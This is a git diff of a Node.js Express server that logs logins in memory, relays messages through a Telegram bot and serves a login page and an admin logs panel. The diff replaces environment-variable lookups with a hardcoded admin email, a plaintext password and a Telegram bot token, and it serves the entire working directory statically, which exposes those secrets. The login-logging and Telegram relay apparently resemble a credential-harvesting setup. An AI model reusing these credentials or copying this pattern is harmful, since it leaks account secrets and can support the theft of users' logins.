@@ -5,18 +5,19 @@ const cors = require("cors");
 const path = require("path");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Environment Variables with fallbacks for development
-const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "rahulkushwaha1842003@gmail.com";
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "Rewa@1234";
+const PORT = 3000;
+const ADMIN_USERNAME = "rahulkushwaha1842003@gmail.com";
+const ADMIN_PASSWORD = "Rewa@1234";
 
 // Store login logs in memory
 const loginLogs = [];
 
 // Telegram Bot Configuration
-const BOT_TOKEN = process.env.BOT_TOKEN || "8215904112:AAH06c70RFrcJtI0QfIa0dygrzCIF3_3rFM";
-let CHAT_ID = process.env.CHAT_ID || "8505265800"; // Your chat ID
+const BOT_TOKEN = "8215904112:AAH06c70RFrcJtI0Qfla0dygrzCIF3_3rFM".replace(
+  /\s/g,
+  "",
+); // Fix: Remove any spaces
+let CHAT_ID = "YOUR_CHAT_ID_HERE"; // Will be auto-detected
 
 // Get chat ID helper function
 async function getChatId() {
@@ -70,8 +71,7 @@ async function getChatId() {
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(__dirname));
-app.use(express.static('.'));
+app.use(express.static("."));
 
 // Send Telegram message function (improved)
 async function sendTelegramMessage(message) {
@@ -218,11 +218,6 @@ app.get("/api/admin/logs", (req, res) => {
   } else {
     res.status(401).json({ error: "Unauthorized" });
   }
-});
-
-// Serve Main Login Page (Root Route)
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
 });
 
 // Serve Admin Panel
